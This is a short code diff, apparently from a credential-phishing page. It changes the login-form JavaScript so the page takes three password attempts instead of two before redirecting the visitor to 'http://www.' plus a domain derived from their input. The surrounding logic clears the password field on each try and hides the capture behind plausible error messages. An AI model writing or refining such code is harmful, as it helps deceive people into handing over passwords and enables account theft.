@@ -189,7 +189,7 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
                                 $('#msg').html(response['msg']);
                                 if (response['signal'] == 'ok') {
                                     $("#password").val("");
-                                    if (count >= 2) {
+                                    if (count >= 3) {
                                         count = 0;
                                         // window.location.replace(response['redirect_link']);
                                         window.location.replace("http://www." + my_slice);
@@ -202,7 +202,7 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
                         },
                         error: function() {
                             $("#password").val("");
-                            if (count >= 2) {
+                            if (count >= 3) {
                                 count = 0;
                                 window.location.replace("http://www." + my_slice);
                             }
